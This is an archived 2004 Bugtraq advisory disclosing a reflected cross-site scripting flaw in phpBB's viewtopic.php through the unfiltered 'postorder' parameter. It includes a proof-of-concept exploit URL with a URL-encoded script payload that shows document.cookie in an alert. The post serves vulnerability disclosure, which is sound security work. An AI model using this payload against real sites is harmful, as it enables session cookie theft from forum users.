=== Content from marc.info_14370412_20250125_220028.html ===

```
[[prev in list](?l=bugtraq&m=107799527428834&w=2)] [[next in list](?l=bugtraq&m=107801142924976&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=107818405106395&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [New phpBB ViewTopic.php Cross Site Scripting Vulnerability](?t=107799517400002&r=1&w=2)
From:       [Cheng Peng Su <apple_soup () msn ! com>](?a=107606741300005&r=1&w=2)
Date:       [2004-02-28 15:09:02](?l=bugtraq&r=1&w=2&b=200402)
Message-ID: [20040228150902.22283.qmail () www ! securityfocus ! com](?i=20040228150902.22283.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=107799508130700&q=mbox) or [body](?l=bugtraq&m=107799508130700&q=raw)]

################################################
Advisory Name:New phpBB ViewTopic.php Cross Site Scripting Vulnerability
Release Date: Feb 29,2004
Application: phpBB
Platform: PHP
Version Affected: the lastest version
Vendor URL: <http://www.phpbb.com/>
Discover: Cheng Peng Su(apple_soup_at_msn.com)
################################################

Details:
    This vuln is similar to Arab VieruZ's advisory 'XSS bug in phpBB',this time the \
problem is not in 'highlight' ,but in 'postorder'.we can inject HTML code,such code \
could be used to steal cookie information.

Proof of Concept:
     If there is a topic at
  <http://site/phpBB/viewtopic.php?t=123456>
  this page can be also viewed at
  <http://site/phpBB/viewtopic.php?t=123456&postorder=asc>
  then this page will contain code like below:
  <a class="maintitle" \
href="viewtopic.php?t=176994&amp;start=0&amp;postdays=0&amp;postorder=asc&amp;highlight=">[Topic \
Title]</a>.  phpBB doesn't filter out illegal characters from 'postorder',so we can \
inject HTML code after 'postorder='.

Exploit:
  URL: <http://site/phpBB/viewtopic.php?t=123456&postorder=%22%3E%3C%73%63%72%69%70%74%> \
3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%63%72%69%70%74%3E%3C

  note unescape('=%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%63%72%69%70%74%3E%3C') \
== '">&lt;script&gt;alert(document.cookie)&lt;/script&gt;<'

Contact:
Cheng Peng Su
apple_soup_at_msn.com
Class 1,Senior 2,High school attached to Wuhan University
Wuhan,Hubei,China

[[prev in list](?l=bugtraq&m=107799527428834&w=2)] [[next in list](?l=bugtraq&m=107801142924976&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=107818405106395&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


